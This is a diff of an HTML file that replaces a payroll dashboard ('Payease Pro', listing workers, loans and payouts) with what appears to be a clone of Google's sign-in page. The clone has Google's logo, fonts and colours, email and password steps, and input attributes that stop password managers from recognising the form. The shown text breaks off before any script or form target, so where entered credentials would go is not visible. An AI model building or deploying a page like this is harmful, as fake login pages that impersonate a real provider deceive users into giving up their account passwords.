@@ -1,384 +1,761 @@
 <!DOCTYPE html>
-<html lang="en" class="bg-[#050505] text-white font-sans">
+<html lang="en" data-theme="dark">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Payease Pro | Management</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
-    <script src="https://unpkg.com/lucide@latest"></script>
-<link rel="stylesheet" href="/frontend/src/style.css">
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-   
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in – Google Accounts</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="src/style.css">
+<script>
+tailwind.config = {
+  darkMode: ['selector', '[data-theme="dark"]'],
+  theme: {
+    extend: {
+      fontFamily: {
+        'google': ['"Google Sans"', 'sans-serif'],
+        'roboto': ['Roboto', 'Arial', 'sans-serif'],
+      },
+      colors: {
+        /* dark tokens */
+        'd-page':    '#1f1f1f',
+        'd-card':    '#2d2d2d',
+        'd-input':   '#5f6368',
+        'd-focus':   '#8ab4f8',
+        'd-error':   '#f28b82',
+        'd-text':    '#e3e3e3',
+        'd-muted':   '#ababab',
+        'd-link':    '#8ab4f8',
+        'd-btnbg':   '#8ab4f8',
+        'd-btnfg':   '#202124',
+        'd-chip':    '#5f6368',
+        'd-avatar':  '#4285f4',
+        'd-divider': '#3c3c3c',
+        /* light tokens */
+        'l-page':    '#f1f3f4',
+        'l-card':    '#ffffff',
+        'l-border':  '#dadce0',
+        'l-focus':   '#1a73e8',
+        'l-error':   '#d93025',
+        'l-text':    '#202124',
+        'l-muted':   '#5f6368',
+        'l-link':    '#1a73e8',
+        'l-btnbg':   '#1a73e8',
+        'l-btnfg':   '#ffffff',
+        'l-avatar':  '#1a73e8',
+        'l-divider': '#e0e0e0',
+      },
+      borderRadius: {
+        'card': '28px',
+      },
+      maxWidth: {
+        'card': '860px',
+      }
+    }
+  }
+}
+</script>
+<style>
+  /* ── custom properties injected by JS on load ── */
+  *, *::before, *::after { box-sizing: border-box; }
+
+  /* floating-label input — cannot be done with pure Tailwind */
+  .fl-label {
+    position: absolute;
+    left: 17px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 16px;
+    pointer-events: none;
+    transition: top .15s, transform .15s, font-size .15s, color .15s;
+    transform-origin: left center;
+  }
+  .fl-input:focus ~ .fl-label,
+  .fl-input:not(:placeholder-shown) ~ .fl-label {
+    top: 10px;
+    transform: translateY(0) scale(.75);
+  }
+
+  /* slide-in animation for steps */
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateX(12px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+  .step-active { animation: slideIn .2s ease; }
+
+  /* error row slide */
+  .err-row {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height .2s ease, margin-top .2s ease;
+    margin-top: 0;
+  }
+  .err-row.err-show { max-height: 60px; margin-top: 6px; }
+
+  /* disable browser autofill background flash */
+  input:-webkit-autofill,
+  input:-webkit-autofill:hover,
+  input:-webkit-autofill:focus {
+    transition: background-color 9999s ease 9999s, color 9999s ease 9999s;
+    -webkit-text-fill-color: inherit !important;
+  }
+</style>
 </head>
-<body class="overflow-hidden">
 
-    <div class="fixed top-[-10%] left-[-10%] w-96 h-96 bg-premium-neonPurple/10 rounded-full blur-[120px] -z-10"></div>
-    <div class="fixed bottom-[-10%] right-[-10%] w-96 h-96 bg-premium-neonBlue/10 rounded-full blur-[120px] -z-10"></div>
+<!-- ROOT: bg switches between dark/light via JS class toggle on <html> -->
+<body id="body" class="
+  min-h-screen flex flex-col font-roboto
+  bg-[#1f1f1f] text-[#e3e3e3]
+  transition-colors duration-300
+">
 
-    <main id="app" class="h-screen w-full flex flex-col p-5 pb-32 overflow-y-auto">
-        
-        <header class="flex justify-between items-center mb-6 pt-6">
-    <div>
-        <h2 class="text-[10px] uppercase tracking-[0.3em] text-gray-500 font-bold">Manager Dashboard</h2>
-        <h1 class="text-2xl font-extrabold tracking-tight text-white">Buchu Kassa</h1>
-    </div>
-    <div class="relative w-14 h-14 rounded-2xl glass flex items-center justify-center border-white/10 border overflow-hidden group">
-        <img src="/frontend/public/logo.png" alt="Payease Pro" class="w-20 h-16 z-10 group-hover:scale-110 transition-transform duration-500">
-        
-        <div class="absolute inset-0 bg-gradient-to-tr from-premium-neonBlue/20 to-premium-neonPurple/20 blur-xl opacity-50"></div>
-    </div>
-</header>
+<!-- ══════════════════════════════════════════════
+     THEME TOGGLE
+═══════════════════════════════════════════════ -->
+<button
+  id="theme-btn"
+  onclick="toggleTheme()"
+  aria-label="Toggle dark/light mode"
+  class="
+    fixed top-4 right-4 z-50
+    w-10 h-10 rounded-full
+    flex items-center justify-center
+    border border-[#5f6368]
+    bg-[#2d2d2d] text-[#e3e3e3]
+    shadow-md cursor-pointer
+    transition-colors duration-200
+    hover:bg-white/5
+  "
+>
+  <!-- moon (dark mode shown) -->
+  <svg id="icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+  </svg>
+  <!-- sun (light mode shown) -->
+  <svg id="icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+    class="hidden">
+    <circle cx="12" cy="12" r="5"/>
+    <line x1="12" y1="1" x2="12" y2="3"/>
+    <line x1="12" y1="21" x2="12" y2="23"/>
+    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/>
+    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
+    <line x1="1" y1="12" x2="3" y2="12"/>
+    <line x1="21" y1="12" x2="23" y2="12"/>
+    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/>
+    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+  </svg>
+</button>
 
-    <section id="dashboard" class="tab-content active space-y-8">
-        <div id="sync-indicator" class="absolute top-4 right-6 flex items-center gap-2 opacity-0 transition-opacity">
-    <div class="w-1.5 h-1.5 bg-premium-neonBlue rounded-full animate-pulse"></div>
-    <span class="text-[8px] font-black text-gray-500 uppercase tracking-tighter">Syncing Live</span>
-</div>
-    <div class="glass rounded-[2.5rem] p-8 text-center relative overflow-hidden border-t-2 border-premium-neonBlue/30 shadow-[0_20px_50px_rgba(0,210,255,0.1)]">
-        <p class="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400 mb-2">Total Unpaid Cash</p>
-        <h3 class="text-6xl font-black tracking-tighter text-white">
-            <span id="unpaid-payroll-counter">0</span>
-            <span class="text-lg font-bold text-premium-neonBlue ml-1">ETB</span>
-        </h3>
-        <p class="text-[9px] text-gray-600 mt-2 font-bold uppercase tracking-widest">To pay all active workers</p>
-    </div>
+<!-- ══════════════════════════════════════════════
+     MAIN
+═══════════════════════════════════════════════ -->
+<main class="flex-1 flex items-center justify-center px-4 py-10">
 
-    <div class="grid grid-cols-2 gap-4">
-        <div class="glass rounded-[2rem] p-6 border-l-4 border-premium-neonGreen bg-gradient-to-br from-white/[0.02] to-transparent">
-            <p class="text-[9px] font-black uppercase tracking-widest text-gray-500 mb-1">Workers Here</p>
-            <p class="text-3xl font-black text-white" data-stat="total-workers">0</p>
-        </div>
-        <div class="glass rounded-[2rem] p-6 border-l-4 border-premium-neonPurple bg-gradient-to-br from-white/[0.02] to-transparent">
-            <p class="text-[9px] font-black uppercase tracking-widest text-gray-500 mb-1">Workers Loan</p>
-            <p class="text-3xl font-black text-white" data-stat="total-loans">0</p>
-        </div>
-    </div>
+  <!-- CARD -->
+  <div
+    id="card"
+    class="
+      w-full max-w-[860px] rounded-[28px] overflow-hidden
+      grid grid-cols-1 md:grid-cols-[1fr_1px_1fr]
+      bg-[#2d2d2d] border border-transparent
+      transition-colors duration-300
+    "
+  >
 
-    <div class="grid grid-cols-2 gap-4">
-        <div class="glass rounded-[2rem] p-6 border-l-4 border-premium-neonBlue">
-            <p class="text-[9px] font-black uppercase tracking-widest text-gray-500 mb-1">Total Money Out</p>
-            <p class="text-2xl font-black text-white" data-stat="total-money-out">0</p>
-        </div>
-        <div class="glass rounded-[2rem] p-6 border-l-4 border-premium-neonGreen">
-            <p class="text-[9px] font-black uppercase tracking-widest text-gray-500 mb-1">Total Clubs</p>
-            <p class="text-2xl font-black text-white" data-stat="total-clubs">0</p>
-        </div>
-    </div>
+    <!-- ── LEFT PANEL ── -->
+    <div class="flex flex-col gap-7 p-10 md:p-14">
 
-    <div class="glass rounded-[2.5rem] p-6 border border-white/5">
-        <h4 class="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400 mb-6 italic">Weekly Spending Trend</h4>
-        <div class="h-52 w-full">
-            <canvas id="payoutChart"></canvas>
-        </div>
-    </div>
-</section>
+      <!-- Google G mark -->
+      <svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+        <path d="M39.2 20.45c0-1.55-.14-3.04-.4-4.47H20v8.46h10.8c-.47 2.47-1.87 4.57-3.98 5.97v4.96h6.44c3.77-3.47 5.94-8.59 5.94-14.92z" fill="#4285F4"/>
+        <path d="M20 40c5.4 0 9.94-1.79 13.26-4.84l-6.44-4.96c-1.8 1.2-4.1 1.91-6.82 1.91-5.25 0-9.69-3.55-11.28-8.32H2.07v5.12A20 20 0 0 0 20 40z" fill="#34A853"/>
+        <path d="M8.72 23.79A12.02 12.02 0 0 1 8.1 20c0-1.31.22-2.58.62-3.79V11.1H2.07A20 20 0 0 0 0 20c0 3.23.77 6.29 2.07 9.01l6.65-5.22z" fill="#FBBC05"/>
+        <path d="M20 7.95c2.96 0 5.61 1.02 7.7 3.02l5.78-5.78C29.93 1.99 25.39 0 20 0A20 20 0 0 0 2.07 11.1l6.65 5.12C10.31 11.5 14.75 7.95 20 7.95z" fill="#EA4335"/>
+      </svg>
 
+      <!-- Heading + subtext -->
+      <div>
+        <h1 id="main-heading"
+          class="font-google text-[32px] font-normal leading-tight text-[#e3e3e3] transition-colors duration-300">
+          Sign in
+        </h1>
+        <p id="main-subtext"
+          class="text-base leading-relaxed text-[#ababab] max-w-[270px] mt-3 transition-all duration-300">
+          with your Google Account. This account will be available to other Google apps in the browser.
+        </p>
+      </div>
 
-       <section id="workers" class="tab-content space-y-6 pb-20">
-    <div class="flex justify-between items-center px-2">
-        <div class="flex-shrink-0">
-            <h3 class="text-2xl font-extrabold tracking-tight uppercase">Worker List</h3>
-            <p class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Manage your workers</p>
-        </div>
-        
-        <div class="relative flex justify-end">
-           <input type="text" 
-       id="worker-search-input" 
-       oninput="filterWorkers()" 
-       placeholder="Find worker..." 
-                   class="glass w-32 focus:w-44 py-2 px-4 rounded-xl text-[10px] border-white/5 transition-all outline-none italic placeholder:text-gray-600 focus:border-premium-neonBlue/50">
-        </div>
-    </div>
+      <!-- Avatar chip (hidden until email step) -->
+      <div
+        id="avatar-chip"
+        onclick="goBackToEmail()"
+        role="button"
+        tabindex="0"
+        aria-label="Change account"
+        onkeydown="if(event.key==='Enter')goBackToEmail()"
+        class="
+          hidden items-center gap-2.5
+          w-fit max-w-[270px]
+          border border-[#5f6368] rounded-full
+          px-3.5 py-1.5 pl-1.5
+          cursor-pointer
+          transition-colors duration-150
+          hover:bg-white/[0.06]
+        "
+      >
+        <div id="avatar-circle"
+          class="
+            w-8 h-8 rounded-full shrink-0
+            bg-[#4285f4] text-white
+            font-google text-sm font-medium
+            flex items-center justify-center
+          ">A</div>
+        <span id="chip-email"
+          class="text-sm text-[#e3e3e3] truncate max-w-[170px] transition-colors duration-300">
+          user@gmail.com
+        </span>
+        <span class="text-[10px] text-[#ababab]">▾</span>
+      </div>
 
-    <div id="worker-list-container" class="space-y-4">
-        </div>
+    </div><!-- /panel-left -->
 
-    <button onclick="triggerAddFlow()" class="fixed bottom-32 right-3 w-8 h-8 rounded-2xl bg-premium-neonBlue shadow-[0_0_20px_rgba(0,243,255,0.3)] flex items-center justify-center text-black active:scale-90 transition-all z-40">
-        <i data-lucide="plus" class="w-8 h-8"></i>
-    </button>
-</section>
+    <!-- ── VERTICAL DIVIDER ── -->
+    <div id="v-divider" class="hidden md:block bg-[#3c3c3c] transition-colors duration-300"></div>
 
-        <section id="history" class="tab-content">
-    <div class="px-6 py-6">
- <div>
-                    <h3 class="text-2xl font-extrabold tracking-tight uppercase">Payment History</h3>
-                    <p class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Review your transaction history</p>
-                </div>        
-        <div class="flex flex-col gap-3 mb-8">
-            <div class="glass flex items-center px-4 rounded-2xl border border-white/5">
-                <i data-lucide="search" class="w-4 h-4 text-gray-500"></i>
-                <input type="text" id="history-search" placeholder="Search worker or ID..." 
-                       oninput="fetchHistory()"
-                       class="bg-transparent border-none text-white text-xs p-4 w-full focus:ring-0">
-            </div>
-            
-            <div class="flex gap-2">
-                <select id="filter-type" onchange="fetchHistory()" 
-                        class="glass flex-1 bg-transparent border border-white/5 text-gray-400 text-[10px] font-bold uppercase p-3 rounded-xl appearance-none">
-                    <option value="">ALL TYPES</option>
-                    <option value="payout">PAYOUTS</option>
-                    <option value="loan">LOANS</option>
-                </select>
-                </div>
-        </div>
+    <!-- ── RIGHT PANEL ── -->
+    <div class="flex flex-col justify-center px-10 pb-12 pt-3 md:p-14">
 
-        <div id="history-list-container"></div>
-        
-        <div id="load-more-container" class="hidden py-6">
-            <button onclick="fetchHistory(true)" class="w-full py-4 glass text-[10px] font-black uppercase text-gray-400 rounded-2xl active:scale-95 transition-all">
-                Load Older Transactions
-            </button>
-        </div>
-    </div>
-</section>
+      <!-- STEP 1: EMAIL -->
+      <div id="step-email" class="flex flex-col step-active">
 
-   <section id="reports" class="tab-content pb-32 hidden">
-    <div class="px-6 pt-8">
-        <h2 class="text-2xl font-black text-white uppercase tracking-tighter mb-1">Command Center</h2>
-        <p class="text-[10px] font-bold text-gray-500 uppercase tracking-[0.2em] mb-8">Generated PDF Reports & Analytics</p>
-
-        <div class="grid grid-cols-3 gap-3 mb-8">
-            <button onclick="setReportMode('audit')" class="report-mode-btn p-4 rounded-3xl border border-premium-neonBlue bg-white/5 flex flex-col items-center gap-2 transition-all">
-                <i data-lucide="building-2" class="w-5 h-5 text-premium-neonBlue"></i>
-                <span class="text-[8px] font-black uppercase text-white">Club Audit</span>
-            </button>
-            <button onclick="setReportMode('worker')" class="report-mode-btn p-4 rounded-3xl border border-white/10 flex flex-col items-center gap-2 transition-all">
-                <i data-lucide="user" class="w-5 h-5 text-gray-500"></i>
-                <span class="text-[8px] font-black uppercase">Worker</span>
-            </button>
-            <button onclick="setReportMode('debt')" class="report-mode-btn p-4 rounded-3xl border border-white/10 flex flex-col items-center gap-2 transition-all">
-                <i data-lucide="hand-coins" class="w-5 h-5 text-gray-500"></i>
-                <span class="text-[8px] font-black uppercase">Debt History</span>
-            </button>
-        </div>
-
-        <div class="glass rounded-[2.5rem] p-6 border border-white/5 space-y-6">
-            <div id="filter-club-section">
-                <p class="text-[9px] font-black text-gray-500 uppercase tracking-widest mb-3">Target Club</p>
-                <div class="flex gap-2 overflow-x-auto pb-2 no-scrollbar" id="report-club-list">
-                    <button onclick="setReportClub('all', this)" class="club-opt-btn px-5 py-3 rounded-2xl bg-white/5 border border-premium-neonBlue text-premium-neonBlue text-[10px] font-black uppercase whitespace-nowrap">All Clubs</button>
-                    <button onclick="setReportClub('Alpha', this)" class="club-opt-btn px-5 py-3 rounded-2xl bg-white/5 border border-white/5 text-gray-500 text-[10px] font-black uppercase whitespace-nowrap">Alpha</button>
-                    <button onclick="setReportClub('Beta', this)" class="club-opt-btn px-5 py-3 rounded-2xl bg-white/5 border border-white/5 text-gray-500 text-[10px] font-black uppercase whitespace-nowrap">Beta</button>
-                </div>
-            </div>
-
-            <div>
-                <div class="flex justify-between items-center mb-3">
-                    <p class="text-[9px] font-black text-gray-500 uppercase tracking-widest">Timeframe</p>
-                    <span id="range-label" class="text-[9px] font-black text-premium-neonBlue uppercase">Last 30 Days</span>
-                </div>
-                <input type="range" min="7" max="90" step="7" value="30" 
-                       oninput="updateReportRange(this.value)"
-                       class="w-full h-1 bg-white/10 rounded-lg appearance-none cursor-pointer accent-premium-neonBlue">
-            </div>
+        <!-- Input -->
+        <div class="relative w-full">
+          <input
+            id="email-input"
+            type="email"
+            placeholder=" "
+            autocomplete="off"
+            autocorrect="off"
+            autocapitalize="off"
+            spellcheck="false"
+            data-lpignore="true"
+            data-form-type="other"
+            class="
+              fl-input
+              w-full h-14 pt-[22px] pb-2 px-4
+              rounded text-base outline-none
+              border border-[#5f6368]
+              bg-transparent text-[#e3e3e3]
+              font-roboto
+              caret-[#8ab4f8]
+              transition-all duration-150
+              focus:border-2 focus:border-[#8ab4f8] focus:px-[15px]
+            "
+          />
+          <label for="email-input" class="fl-label text-[#ababab] transition-colors duration-150">
+            Email or phone
+          </label>
         </div>
 
-        <button id="gen-btn" onclick="generateReport()" class="w-full mt-8 py-5 rounded-[2rem] bg-gradient-to-r from-premium-neonBlue to-premium-neonPurple text-black font-black uppercase tracking-[0.2em] text-[11px] shadow-[0_20px_40px_rgba(0,210,255,0.2)] active:scale-95 transition-all">
-            Execute PDF Generation
-        </button>
-    </div>
-</section>
-
-    </main>
-
-    <nav class="fixed bottom-8 left-1/2 -translate-x-1/2 w-[90%] max-w-md h-20 glass rounded-[2.5rem] flex items-center justify-around px-4 shadow-2xl border-t border-white/10 z-[100]">
-        <button onclick="switchTab('dashboard')" class="nav-btn nav-active flex flex-col items-center gap-1">
-            <i data-lucide="home" class="w-6 h-6"></i>
-            <span class="text-[9px] font-bold uppercase tracking-widest">Home</span>
-        </button>
-        <button onclick="switchTab('workers')" class="nav-btn flex flex-col items-center gap-1 text-gray-600">
-            <i data-lucide="users" class="w-6 h-6"></i>
-            <span class="text-[9px] font-bold uppercase tracking-widest">Worker</span>
-        </button>
-        <button onclick="switchTab('history')" class="nav-btn flex flex-col items-center gap-1 text-gray-600">
-            <i data-lucide="list-ordered" class="w-6 h-6"></i>
-            <span class="text-[9px] font-bold uppercase tracking-widest">Transaction</span>
-        </button>
-        <button onclick="switchTab('reports')" class="nav-btn flex flex-col items-center gap-1 text-gray-600">
-            <i data-lucide="bar-chart-2" class="w-6 h-6"></i>
-            <span class="text-[9px] font-bold uppercase tracking-widest">Reports</span>
-        </button>
-    </nav>
-
- <div id="pay-modal" class="fixed inset-0 bg-black/90 backdrop-blur-xl z-[200] hidden flex items-center justify-center p-6">
-    <div class="glass w-full max-w-sm rounded-[3rem] p-8 border border-white/20 animate-zoom-in">
-        <div class="flex justify-between items-center mb-6">
-            <h3 class="text-xl font-bold uppercase tracking-tighter">Settlement</h3>
-            <span id="modal-days-chip" class="px-2 py-0.5 rounded-md bg-white/5 text-[9px] font-black text-premium-neonBlue border border-white/10 uppercase">0 Days</span>
-        </div>
-        
-    <div class="space-y-3 mb-6">
-            <div class="flex justify-between text-[10px] font-bold uppercase tracking-widest text-gray-500">
-                <span>Gross (Days × Rate)</span>
-                <span id="modal-gross" class="text-white">0 ETB</span>
-            </div>
-            <div class="flex justify-between text-[10px] font-bold uppercase tracking-widest text-gray-500">
-                <span>Already Paid (Partial)</span>
-                <span id="modal-already-paid" class="text-red-400">0 ETB</span>
-            </div>
-
-            <div class="h-px bg-white/10 my-2"></div>
-
-            <div class="space-y-2">
-                <label class="text-[9px] font-black uppercase text-gray-400">Total Payout (Gross Override)</label>
-                <input type="number" id="input-payout-amount" oninput="recalculateSettlement()" 
-                       class="w-full bg-white/5 border border-white/10 rounded-xl py-2 px-3 text-white font-bold outline-none focus:border-premium-neonBlue">
-                
-                <label class="text-[9px] font-black uppercase text-premium-neonPurple">Loan Deduction</label>
-                <input type="number" id="input-loan-deduction" oninput="recalculateSettlement()" 
-                       class="w-full bg-white/5 border border-premium-neonPurple/30 rounded-xl py-2 px-3 text-premium-neonPurple font-bold outline-none focus:border-premium-neonPurple">
-            </div>
-
-            <div id="settlement-status-card" class="mt-4 p-3 rounded-xl bg-white/5 border border-white/5 transition-all duration-300">
-                <div class="flex items-center gap-2 mb-1">
-                    <div id="status-dot" class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></div>
-                    <span id="status-title" class="text-[10px] font-black uppercase tracking-widest text-white">Partial Payment</span>
-                </div>
-                <p id="status-desc" class="text-[9px] text-gray-400 leading-tight">
-                    This will not clear the attendance days. Worker will still have a remaining balance.
-                </p>
-            </div>
-
-            <div class="flex justify-between items-center pt-4 border-t border-white/10">
-                <span class="text-xs font-black uppercase text-gray-400">Final Cash</span>
-                <span id="modal-net" class="text-3xl font-black text-premium-neonGreen tracking-tighter">0 ETB</span>
-            </div>
+        <!-- Error -->
+        <div id="email-err" class="err-row flex items-start gap-1.5 text-xs text-[#f28b82]">
+          <svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor" class="shrink-0 mt-px">
+            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
+          </svg>
+          <span id="email-err-text">Enter an email or phone number</span>
         </div>
 
-        <div class="flex flex-col gap-3">
-            <button onclick="confirmFinalPay(event)" id="confirm-pay-btn" class="w-full bg-premium-neonGreen py-4 rounded-2xl text-black font-black uppercase tracking-widest active:scale-95 transition-all shadow-[0_10px_20px_rgba(74,222,128,0.3)]">
-                Confirm Payment
-            </button>
-            <button onclick="closePayModal()" class="w-full py-2 text-gray-500 font-bold text-xs uppercase tracking-widest">
-                Cancel
-            </button>
-        </div>
-    </div>
-</div>
-  <div id="worker-modal" class="fixed inset-0 bg-black/80 backdrop-blur-lg z-[150] hidden flex items-end">
-    <div class="glass w-full rounded-t-[3rem] p-10 space-y-8 border-t border-white/20 transition-transform duration-500">
-        
-        <div class="flex justify-between items-start">
-            <div>
-                <h3 id="modal-title" class="text-2xl font-bold uppercase">Worker Action</h3>
-                <p id="modal-worker-subtitle" class="text-premium-neonBlue text-[10px] font-bold uppercase tracking-widest">Select an operation</p>
-            </div>
-            <button onclick="closeModal()" class="w-10 h-10 rounded-xl bg-white/5 flex items-center justify-center border border-white/10">
-                <i data-lucide="x" class="w-5 h-5 text-gray-400"></i>
-            </button>
+        <!-- Forgot email -->
+        <div class="mt-4">
+          <a href="#" class="text-sm font-medium text-[#8ab4f8] hover:underline transition-colors duration-150">
+            Forgot email?
+          </a>
         </div>
 
-        <div id="modal-action-grid" class="grid grid-cols-2 gap-4">
-            <button onclick="processAction('payout')" class="bg-white/5 p-6 rounded-[2rem] flex flex-col items-center gap-3 border border-white/10 active:bg-premium-neonBlue/10 transition-all">
-                <i data-lucide="wallet" class="w-8 h-8 text-premium-neonBlue"></i>
-                <span class="text-[10px] font-black uppercase tracking-widest">Pay Salary</span>
-            </button>
-            <button onclick="triggerLoanMode()" class="bg-white/5 p-6 rounded-[2rem] flex flex-col items-center gap-3 border border-white/10 active:bg-premium-neonPurple/10 transition-all">
-                <i data-lucide="hand-coins" class="w-8 h-8 text-premium-neonPurple"></i>
-                <span class="text-[10px] font-black uppercase tracking-widest">Give Loan</span>
-            </button>
+        <!-- Guest mode info -->
+        <p class="text-sm leading-relaxed text-[#ababab] mt-7 transition-colors duration-300">
+          Not your computer? Use Guest mode to sign in privately.
+          <a href="#" class="text-[#8ab4f8] font-normal hover:underline">Learn more about using Guest mode</a>
+        </p>
+
+        <!-- Buttons -->
+        <div class="flex justify-between items-center mt-10">
+          <!-- Locate your Step 1 buttons and append the target class identifier at the end -->
+<button class="
+  font-google text-sm font-medium
+  text-[#8ab4f8] px-2 py-2.5 rounded
+  cursor-pointer border-none bg-transparent
+  hover:bg-[rgba(138,180,248,0.1)]
+  transition-colors duration-100 tracking-[0.25px]
+  btn-txt
+">Create account</button>
+
+<button onclick="goToPassword()" class="
+  font-google text-sm font-medium
+  bg-[#8ab4f8] text-[#202124]
+  px-7 py-2.5 rounded-full
+  cursor-pointer border-none
+  hover:brightness-90 active:brightness-75
+  transition-all duration-100 tracking-[0.25px]
+  btn-pri
+">Next</button>
         </div>
 
-        <div id="modal-edit-form" class="hidden space-y-6">
-            <div class="space-y-4">
-                <input type="text" id="edit-name" placeholder="Full Name" class="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white placeholder:text-gray-600 focus:border-premium-neonBlue outline-none transition-all">
-                <div class="relative">
-                    <select id="edit-club" class="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white appearance-none focus:border-premium-neonBlue outline-none transition-all cursor-pointer">
-                        <option value="Q/giwerigos" class="bg-[#0b0b0b]">Q/Giwerigos</option>
-                        <option value="Diredewa" class="bg-[#0b0b0b]">Diredewa</option>
-                        <option value="BahirDar" class="bg-[#0b0b0b]">BahirDar</option>
-                        <option value="E/Buna" class="bg-[#0b0b0b]">E/Buna</option>
-                    </select>
-                    <div class="absolute right-5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-500">
-                        <i data-lucide="chevron-down" class="w-4 h-4"></i>
-                    </div>
-                </div>
-                <input type="number" id="edit-rate" placeholder="Daily Rate" class="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white placeholder:text-gray-600 focus:border-premium-neonBlue outline-none transition-all">
-            </div>
-            <button onclick="submitEdit()" id="edit-submit-btn" class="w-full bg-white py-5 rounded-[2rem] text-black font-black uppercase text-[10px] tracking-[0.2em] shadow-xl active:scale-95 transition-all">Update Profile</button>
+      </div><!-- /step-email -->
+
+      <!-- STEP 2: PASSWORD -->
+      <div id="step-password" class="hidden flex-col step-active">
+
+        <!-- Input -->
+        <div class="relative w-full">
+          <input
+            id="pw-input"
+            type="password"
+            placeholder=" "
+            autocomplete="new-password"
+            data-lpignore="true"
+            data-form-type="other"
+            class="
+              fl-input
+              w-full h-14 pt-[22px] pb-2 px-4 pr-12
+              rounded text-base outline-none
+              border border-[#5f6368]
+              bg-transparent text-[#e3e3e3]
+              font-roboto
+              caret-[#8ab4f8]
+              transition-all duration-150
+              focus:border-2 focus:border-[#8ab4f8] focus:px-[15px]
+            "
+          />
+          <label for="pw-input" class="fl-label text-[#ababab] transition-colors duration-150">
+            Enter your password
+          </label>
+          <!-- Eye toggle -->
+          <button
+            id="eye-btn"
+            type="button"
+            onclick="togglePw()"
+            aria-label="Show password"
+            class="
+              absolute right-2.5 top-1/2 -translate-y-1/2
+              p-2 rounded-full
+              bg-transparent border-none cursor-pointer
+              text-[#ababab]
+              hover:bg-white/[0.06]
+              flex items-center justify-center
+              transition-colors duration-150
+            "
+          >
+            <svg id="eye-open" width="22" height="22" viewBox="0 0 24 24" fill="none"
+              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg id="eye-off" width="22" height="22" viewBox="0 0 24 24" fill="none"
+              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+              class="hidden">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
         </div>
 
-        <div id="modal-loan-form" class="hidden space-y-6 animate-in fade-in slide-in-from-bottom-4">
-            <div class="space-y-2">
-                <label class="text-[10px] font-black uppercase text-gray-500 ml-1">Loan Amount (ETB)</label>
-                <input type="number" id="loan-amount-input" placeholder="Enter Amount" class="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white placeholder:text-gray-600 focus:border-premium-neonPurple outline-none transition-all">
-            </div>
-            <button onclick="submitLoan()" id="loan-submit-btn" class="w-full bg-premium-neonPurple py-5 rounded-[2rem] text-black font-black uppercase text-[10px] tracking-[0.2em] shadow-xl shadow-purple-500/20 active:scale-95 transition-all">
-                Confirm Loan
-            </button>
+        <!-- Error -->
+        <div id="pw-err" class="err-row flex items-start gap-1.5 text-xs text-[#f28b82]">
+          <svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor" class="shrink-0 mt-px">
+            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
+          </svg>
+          <span>Wrong password. Try again or click Forgot password to reset it.</span>
         </div>
 
-    </div>
-</div>
-    <div id="detail-modal" class="fixed inset-0 z-[700] hidden bg-black/60 backdrop-blur-sm transition-opacity duration-300">
-    <div class="glass fixed bottom-0 left-0 right-0 max-h-[95vh] overflow-y-auto rounded-t-[2.5rem] p-6 shadow-2xl transition-transform duration-500 translate-y-full border-t border-white/10 pb-10">
-        
-        <div class="flex items-center justify-between mb-8">
-    <button onclick="openEditWorker()" class="text-[10px] font-black uppercase tracking-widest text-premium-neonBlue flex items-center gap-2 bg-white/5 px-4 py-2.5 rounded-xl border border-white/5 active:scale-90 transition-all">
-        <i data-lucide="edit-3" class="w-3.5 h-3.5"></i> Edit
-    </button>
-
-    <div class="h-1.5 w-12 rounded-full bg-white/10"></div>
-
